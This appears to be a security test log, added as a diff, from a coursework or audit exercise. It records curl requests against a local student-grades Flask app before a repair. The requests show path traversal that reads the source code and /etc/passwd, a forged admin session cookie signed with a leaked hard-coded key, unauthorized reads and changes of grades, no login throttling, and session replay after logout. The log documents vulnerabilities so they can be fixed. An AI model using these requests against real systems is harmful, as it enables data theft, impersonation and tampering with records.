@@ -1,0 +1,366 @@
+Target: http://127.0.0.1:5050 (container 'before', commit 821a6af, before the repair)
+Date:   2026-11-16 16:54 UTC
+
+=============== F-03 Debug mode (container log) ===============
+ * Debug mode: on
+ * Debugger is active!
+
+=============== F-13 /files without authentication ===============
+## anonymous download
+$ curl 'http://127.0.0.1:5050/files?path=srs-summary.txt'
+Secure Requirements Engineering summary
+-> HTTP 200
+
+=============== F-02 Path traversal ===============
+## relative path out of materials/ (returns the source code)
+$ curl -b cookies/alice 'http://127.0.0.1:5050/files?path=../baseline_secure_coding_api.py'
+import dataclasses
+import pathlib
+import typing
+
+import flask
+
+app = flask.Flask(__name__)
+app.config["SECRET_KEY"] = "dev-secret-key"
+
+# -----------------------------------------------------------------------------
+# Intentionally small in-memory "database"
+# --------------------------------------- [...]
+-> HTTP 200
+
+## absolute path
+$ curl -b cookies/alice 'http://127.0.0.1:5050/files?path=/etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/va [...]
+-> HTTP 200
+
+=============== F-04 Grade reads not scoped ===============
+## anonymous reads Bob's grades
+$ curl http://127.0.0.1:5050/grades/1002
+[
+  {
+    "course_id": "SRS",
+    "grade": 15,
+    "student_id": 1002
+  }
+]
+
+-> HTTP 200
+
+## alice reads Bob's grades
+$ curl -b cookies/alice http://127.0.0.1:5050/grades/1002
+[
+  {
+    "course_id": "SRS",
+    "grade": 15,
+    "student_id": 1002
+  }
+]
+
+-> HTTP 200
+
+## prof_srs reads student 1001 (includes SSD, not assigned)
+$ curl -b cookies/prof http://127.0.0.1:5050/grades/1001
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+-> HTTP 200
+
+## no permitted records: 200 [] instead of a denial (R4)
+$ curl http://127.0.0.1:5050/grades/9999
+[]
+
+-> HTTP 200
+
+=============== F-05 Profile reads ===============
+## anonymous reads Bob's profile
+$ curl http://127.0.0.1:5050/students/1002/profile
+{
+  "email": "bob@uc.pt",
+  "name": "Bob",
+  "program": "MEI",
+  "student_id": 1002
+}
+
+-> HTTP 200
+
+## alice reads Bob's profile
+$ curl -b cookies/alice http://127.0.0.1:5050/students/1002/profile
+{
+  "email": "bob@uc.pt",
+  "name": "Bob",
+  "program": "MEI",
+  "student_id": 1002
+}
+
+-> HTTP 200
+
+## prof_srs reads a profile (forbidden by R3)
+$ curl -b cookies/prof http://127.0.0.1:5050/students/1001/profile
+{
+  "email": "alice@uc.pt",
+  "name": "Alice",
+  "program": "MEI",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
+=============== F-14 Student identifier not validated ===============
+## GET /grades/-1
+$ curl http://127.0.0.1:5050/grades/-1
+[]
+
+-> HTTP 200
+
+## GET /grades/0
+$ curl http://127.0.0.1:5050/grades/0
+[]
+
+-> HTTP 200
+
+## GET /grades/+1001
+$ curl http://127.0.0.1:5050/grades/+1001
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+-> HTTP 200
+
+## GET /grades/1_001
+$ curl http://127.0.0.1:5050/grades/1_001
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+-> HTTP 200
+
+=============== F-09 Error handler ===============
+## unknown route (expected 404)
+$ curl http://127.0.0.1:5050/nope
+{
+  "error": "404 Not Found: The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.",
+  "type": "NotFound"
+}
+
+-> HTTP 500
+
+## wrong method (expected 405)
+$ curl http://127.0.0.1:5050/login
+{
+  "error": "405 Method Not Allowed: The method is not allowed for the requested URL.",
+  "type": "MethodNotAllowed"
+}
+
+-> HTTP 500
+
+## wrong content type (expected 4xx)
+$ curl -X POST -H 'Content-Type: text/plain' -d x http://127.0.0.1:5050/grades/update
+{
+  "error": "415 Unsupported Media Type: Did not attempt to load JSON data because the request Content-Type was not 'application/json'.",
+  "type": "UnsupportedMediaType"
+}
+
+-> HTTP 500
+
+## invalid id (expected 400)
+$ curl http://127.0.0.1:5050/grades/abc
+{
+  "error": "invalid literal for int() with base 10: 'abc'",
+  "type": "ValueError"
+}
+
+-> HTTP 500
+
+## missing file (expected 404; leaks the server path)
+$ curl -b cookies/alice 'http://127.0.0.1:5050/files?path=nope.txt'
+{
+  "error": "[Errno 2] No such file or directory: '/app/materials/nope.txt'",
+  "type": "FileNotFoundError"
+}
+
+-> HTTP 500
+
+=============== F-06 Session forgery with the hard-coded key ===============
+(the key is in the source, which F-02 discloses; the cookie is signed with it)
+## forged admin cookie accepted by /me
+$ curl -b session=eyJ1c2VyIjoiYWRtaW4xIiwicm9sZSI6ImFkbWluIn0.avs1RQ.9cd7FeVnd9Ue4_2Yf3r4FdVjwFs http://127.0.0.1:5050/me
+{
+  "courses": null,
+  "role": "admin",
+  "student_id": null,
+  "user": "admin1"
+}
+
+-> HTTP 200
+
+=============== F-12 Session cookie attributes ===============
+$ curl -s -D - -o /dev/null -d 'username=alice&password=alicepw' http://127.0.0.1:5050/login | grep -i set-cookie
+Set-Cookie: session=<value>; HttpOnly; Path=/
+(no Secure and no SameSite attribute)
+
+=============== F-11 Session not revoked on logout ===============
+## same browser after logout
+$ curl -b cookies/replay http://127.0.0.1:5050/me
+{
+  "user": null
+}
+
+-> HTTP 200
+
+## cookie saved before logout, replayed
+$ curl -b cookies/replay-saved http://127.0.0.1:5050/me
+{
+  "courses": [],
+  "role": "student",
+  "student_id": 1001,
+  "user": "alice"
+}
+
+-> HTTP 200
+
+=============== F-10 No login throttling ===============
+## 50 wrong passwords for alice
+status codes: 50 401
+
+## correct password right after (follows the redirect to /me)
+$ curl -L -c cookies/bf -b cookies/bf -d 'username=alice&password=alicepw' http://127.0.0.1:5050/login
+{
+  "courses": [],
+  "role": "student",
+  "student_id": 1001,
+  "user": "alice"
+}
+
+-> HTTP 200
+
+=============== F-08 Grade update not validated (changes data) ===============
+## student_id as a string creates a shadow record
+$ curl -X POST -H 'Content-Type: application/json' -d '{"student_id":"1001","course_id":"SRS","grade":0}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SRS",
+  "grade": 0,
+  "status": "ok",
+  "student_id": "1001"
+}
+
+-> HTTP 200
+
+## the real record is unchanged (shadow record is invisible)
+$ curl http://127.0.0.1:5050/grades/1001
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+-> HTTP 200
+
+## boolean grade
+$ curl -X POST -H 'Content-Type: application/json' -d '{"student_id":1001,"course_id":"SRS","grade":true}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SRS",
+  "grade": true,
+  "status": "ok",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
+## NaN grade
+$ curl -X POST -H 'Content-Type: application/json' -d '{"student_id":1001,"course_id":"SRS","grade":NaN}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SRS",
+  "grade": NaN,
+  "status": "ok",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
+## unknown student, unknown course, negative grade
+$ curl -X POST -H 'Content-Type: application/json' -d '{"student_id":9999,"course_id":"XYZ","grade":-5}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "XYZ",
+  "grade": -5,
+  "status": "ok",
+  "student_id": 9999
+}
+
+-> HTTP 200
+
+=============== F-01 Grade update without authorization (changes data) ===============
+## anonymous update
+$ curl -X POST -H 'Content-Type: application/json' -d '{"student_id":1001,"course_id":"SRS","grade":20}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SRS",
+  "grade": 20,
+  "status": "ok",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
+## student alice updates her own grade
+$ curl -b cookies/alice -X POST -H 'Content-Type: application/json' -d '{"student_id":1001,"course_id":"SRS","grade":20}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SRS",
+  "grade": 20,
+  "status": "ok",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
+## prof_srs updates SSD (not assigned)
+$ curl -b cookies/prof -X POST -H 'Content-Type: application/json' -d '{"student_id":1001,"course_id":"SSD","grade":20}' http://127.0.0.1:5050/grades/update
+{
+  "course_id": "SSD",
+  "grade": 20,
+  "status": "ok",
+  "student_id": 1001
+}
+
+-> HTTP 200
+
